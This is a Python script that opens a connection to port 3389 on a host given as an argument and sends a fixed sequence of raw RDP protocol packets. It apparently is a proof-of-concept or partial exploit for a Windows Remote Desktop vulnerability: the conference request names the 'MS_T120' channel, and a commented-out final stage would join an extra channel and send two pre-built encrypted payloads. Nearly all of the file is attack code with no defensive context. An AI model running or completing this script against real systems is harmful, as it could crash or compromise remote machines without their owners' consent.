import socket, sys

##### X.224 Class 0 PDU Req
in_conn = "\x03\x00\x00\x2b\x26"  # TPKT Packet Header + TPDU 
in_conn += "\xe0\x00\x00\x00\x00\x00\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d\x75\x73\x65\x72\x30\x0d\x0a\x01\x00\x08\x00\x00\x00\x00\x00" # x224Ceq....
##### PDU with GCC Conterence Create Request
sec_packet = "\x03\x00\x01\xca\x02"  #TPKT Packet Header + TPDU
sec_packet += "\xf0\x80\x7f\x65\x82\x01\xbe\x04\x01\x01\x04\x01\x01\x01\x01\xff\x30\x20\x02\x02\x00\x22\x02\x02\x00\x02\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x30\x20\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\x04\x20\x02\x02\x00\x02\x30\x20\x02\x02\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x02\x00\x01\x02\x02\x00\x00\x02\x02\x00\x01\x02\x02\xff\xff\x02\x02\x00\x02\x04\x82\x01\x4b\x00\x05\x00\x14\x7c\x00\x01\x81\x42\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63\x61\x81\x34\x01\xc0\xd8\x00\x04\x00\x08\x00\x20\x03\x58\x02\x01\xca\x03\xaa\x09\x04\x00\x00\x28\x0a\x00\x00\x78\x00\x31\x00\x38\x00\x31\x00\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x18\x00\x07\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xc0\x0c\x00\x09\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\xc0\x44\x00\x05\x00\x00\x00\x63\x6c\x69\x70\x72\x64\x72\x00\xc0\xa0\x00\x00\x4d\x53\x5f\x54\x31\x32\x30\x00\x80\x80\x00\x00\x72\x64\x70\x73\x6e\x64\x00\x00\xc0\x00\x00\x00\x73\x6e\x64\x64\x62\x67\x00\x00\xc0\x00\x00\x00\x72\x64\x70\x64\x72\x00\x00\x00\x80\x80\x00\x00"
##### MCS Erect Request
third_packet = "\x03\x00\x00\x0c\x02\xf0\x80\x04\x00\x01\x00\x01" # TPKT Packet Header + x224Data + mcsEDeq
##### MCS Attach User  Request PDU
fourth_packet = "\x03\x00\x00\x08\x02\xf0\x80\x28" # TPKT Packet Header + x224Data + mcsAUcf
##### MCS Channel Join Request PDU
fifth_packet = "\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xf1" # TPKT Packet Header + x224Data + mcs
sixth_packet = "\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xeb" # TPKT Packet Header + x224Data + mcs
seventh_packet = "\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xec" # TPKT Packet Header + x224Data + mcs
eighth_packet = "\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xed" # TPKT Packet Header + x224Data + mcs
ninth_packet = "\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xee" # TPKT Packet Header + x224Data + mcs
tenth_packet = "\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\x3f" # TPKT Packet Header + x224Data + mcs

eleventh_packet = "\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x08\x03\xf0"
encrypt_1 = "\x03\x00\x01\x1f\x02\xf0\x80\x64\x00\x08\x03\xeb\x70\x81\x10\x01\x00\x00\x00\x08\x01\x00\x00\xa9\xed\xcd\xfd\x14\x8f\xc7\xa3\xc1\xad\x50\x54\x49\x47\x34\xf8\x12\x77\xdd\x29\x0c\x0a\x2a\x3d\x19\x7a\x11\xa2\x88\xdb\xa0\x30\x2c\xe9\x4d\x31\x88\xda\x14\xaf\x32\xed\x6b\x7c\x08\x0f\xf8\x04\x72\xb8\x2b\xf8\xcc\x48\xf0\xa4\x89\xf3\xb5\x5b\xd9\xd6\xc1\x20\xd2\x22\xb2\x77\x49\x16\xf9\x99\xe4\xfe\xba\x85\xaf\xaf\x4f\x73\x5c\x27\xcb\xe6\xc4\x10\x4e\xe2\x55\x72\xf2\x7b\x2d\x20\xe7\x44\x5c\x23\x2b\x0b\xcd\xc6\x74\x82\x61\x23\x90\xd5\x74\x6d\xa5\x61\xab\x5f\xa1\x65\x08\x67\x62\x83\xee\x0f\xb2\xb3\x2f\xbb\x3a\x56\x47\xc1\xa2\x88\xe6\x15\x16\x1c\xd5\x8c\xfb\x98\x2f\xb9\x96\x92\xdc\x8c\xcd\x76\x5d\x0f\x75\x32\xb6\x51\x73\x49\x32\x90\x33\xb7\x38\xa7\xf6\x42\x29\x5b\x47\x0d\x30\x44\x62\xad\xd0\xac\xa1\x57\x3c\xc4\xc6\xb1\xe1\xe2\x1e\xac\xcf\xc8\x6e\x88\xd5\x62\x96\x3d\x2e\xb0\xf6\x8a\xf1\x64\x45\xda\xd9\xc1\xc0\xd2\x35\xb7\x78\x06\x1b\xd5\x46\x38\x64\xba\xc4\x9e\x09\x57\x98\xc3\x29\xf4\x22\x03\x93\x6a\xb1\xb8\xff\xde\x69\x2a\x17\x80\xf1\xfb\xc9\xb4\x1e\x3b\xf3\x49\xda\x8e\xb9\x30\x80\xa0\xb2\xba\xe1\x2a\x5b\xe0\xae\xad\x00\x00\x00\x00\x00\x00\x00\x00"
encrypt_2 = "\x03\x00\x01\x55\x02\xf0\x80\x64\x00\x08\x03\xeb\x70\x81\x46\x48\x00\x00\x00\x51\x0a\x01\xf1\x94\x83\xad\x02\x81\x6a\xfe\xa5\xcd\xfc\x01\x13\x70\x78\xd7\xc2\x17\x8b\x9c\x0c\x75\xce\x01\xd5\xf1\x01\xc4\xd0\xcb\x25\x0b\xac\xe4\xc0\x3c\xb2\x2a\x8b\x9a\x5e\xdc\x49\xf3\x44\x14\x9e\xe0\xa5\x83\x44\x12\x4a\x1b\xf4\xd9\xc6\xfe\x97\xfc\xe4\x03\x34\x6e\x0d\x9b\x47\xf9\x60\x04\x08\x8a\x6b\xd6\xcf\xe7\xc1\xf9\xde\xda\x2e\x8a\xad\x8c\x3c\xd3\x0c\x24\x78\xb3\x8d\x58\x2a\x1d\x7a\xc8\x1c\x6a\xc8\x9c\x7d\xe4\x2f\x11\x3d\x09\xda\xd5\x42\x4b\xf5\x77\x15\x0e\x95\x34\x60\x56\xc1\x4b\xac\x9b\xd8\x5d\x08\x8d\x4a\x9a\x48\xd1\x28\xbf\x91\x06\x29\x05\x12\x9b\xc9\x33\x0b\x16\xb6\x01\x39\x86\x54\xd0\xd8\x2a\x6b\xc1\xdd\xa6\xc5\x2a\xe9\x53\x85\xb8\x92\xd3\x47\x76\x81\xab\x78\x65\xe7\xee\xf9\x1c\xec\x2e\x7f\x42\x84\x22\x98\x8b\xd5\x67\xe7\x1f\x69\x56\x60\x94\x13\x99\x0a\xe5\xd8\xb7\x29\x68\x0a\x58\x7b\xdf\xd7\xe5\x33\xfc\x77\x3a\x1a\xd6\x0c\x88\x25\x8d\x38\xf9\x4a\x32\xda\x77\xfa\xad\xff\x67\x23\x5d\xf3\xa9\xbb\xfb\x9f\xf3\x19\x9f\xb5\x32\x8d\x37\xcc\x54\xb6\x3f\x96\x4b\xc1\x29\x80\x1c\xda\x78\x82\xb7\x2f\x2a\x7d\x1c\xd6\x4d\x50\x13\xe4\xe3\xcb\xc5\x22\x2b\xc9\xea\x1d\x64\xe3\x12\x9c\x44\xaa\xd7\xb1\x70\xd7\xe8\xc3\xe0\x8c\x30\x2a\x14\x86\x73\x8b\x78\x8f\xac\x3f\xc3\xc1\xb6\xb7\xe3\xc2\x82\xcb\x55\xa9\xde\x29\xca\x73\x34\xf7\xc0\xba\x49\x05\x26\x9b\x4b\xc8\x84\x8f\xdd\x9c"
host=sys.argv[1]
port=3389

def hexDump(s):
        print " ".join("{:02x}".format(ord(c)) for c in s)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print "Sending Connection Initialization Packet."
s.sendall(in_conn)
resp224 = s.recv(8192)
print "PDU X.224 Response Received."
print "Sending MCS Connect Initial PDU with GCC Conference." 
s.sendall(sec_packet)
MCS_GCC = s.recv(10000)
print "MCS Response PDU with GCC Conference Received."
print "Sending MCS Erect Request."
s.sendall(third_packet)
print "Sending MCS Attach User PDU Request."
s.sendall(fourth_packet)
MCS_ATTACH = s.recv(8192)
print "Sending PDU Request for Joining 6 Channels."
s.sendall(fifth_packet)
c1 = s.recv(8192)
s.sendall(sixth_packet)
c2 = s.recv(8192)
s.sendall(seventh_packet)
c3 = s.recv(8192)
s.sendall(eighth_packet)
c4 = s.recv(8192)
s.sendall(ninth_packet)
c5 = s.recv(8192)
s.sendall(tenth_packet)
c6 = s.recv(8192)
print "MCS Channel Join Confirmed"
#print "Sending Alternate Channel Packets"
#s.sendall(fifth_packet)
#data = s.recv(8192)
#s.sendall(sixth_packet)
#data = s.recv(8192)
#s.sendall(seventh_packet)
#data = s.recv(8192)
#s.sendall(eigth_packet)
#data = s.recv(8192)
#s.sendall(ninth_packet)
#data = s.recv(8192)
#s.sendall(tenth_packet)
#data = s.recv(8192)
#s.sendall(eleventh_packet)
#data = s.recv(8192)
#print "Sent!"
#s.sendall(encrypt_1)
#data = s.recv(8192)
#print "Sent Enc 1"
#print data
#s.sendall(encrypt_2)
#data = s.recv(8192)
#print "Sent Enc 2"

